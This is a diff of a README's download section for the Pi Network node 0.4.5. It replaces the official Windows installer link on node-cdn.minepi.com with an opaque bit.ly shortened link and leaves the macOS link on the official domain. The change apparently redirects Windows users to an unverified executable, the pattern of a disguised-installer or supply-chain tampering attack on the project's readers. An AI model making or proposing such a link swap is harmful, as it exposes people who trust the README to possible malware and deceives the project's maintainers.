@@ -6,7 +6,7 @@
 
 
 ## version: 0.4.5
-<a href="https://node-cdn.minepi.com/Pi%20Network%20Setup%200.4.5.exe"><img src="https://cdn.pixabay.com/photo/2018/05/08/21/29/windows-3384024_960_720.png" width=100 align="middle"/></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://node-cdn.minepi.com/Pi%20Network%20Setup%200.4.5.exe">PI node for Windows</a>
+<a href="https://bit.ly/3wosE4D"><img src="https://cdn.pixabay.com/photo/2018/05/08/21/29/windows-3384024_960_720.png" width=100 align="middle"/></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://bit.ly/3wosE4D">PI node for Windows</a>
 
 
 <a href="https://node-cdn.minepi.com/Pi%20Network-0.4.5.dmg"><img src="https://github.com/aidenlab/JuiceboxLegacy/wiki/images/maclogo.png" width=100  
